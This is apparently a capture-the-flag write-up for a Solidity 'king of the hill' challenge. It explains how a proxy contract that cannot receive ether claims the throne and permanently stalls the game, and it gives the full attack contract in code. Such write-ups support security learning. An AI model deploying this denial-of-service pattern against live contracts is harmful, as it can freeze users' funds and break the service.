# Requirements

- Your goal is to break the game.

# Attack explanation

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

We can break the game using an attack proxy smartcontract that claims the throne but can't receive money. In this way, we will make a DoS attack to the game and it will be stuck forever.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
contract MaliciousContract {
  address payable public vulnerableScAddress;
  address public attacker;

  constructor(address _vulnerableScAddress) payable {
      vulnerableScAddress = payable(_vulnerableScAddress);
      attacker = msg.sender;
  }

  function attack() public payable {
      vulnerableScAddress.call{value: msg.value}("");
  }
}
```
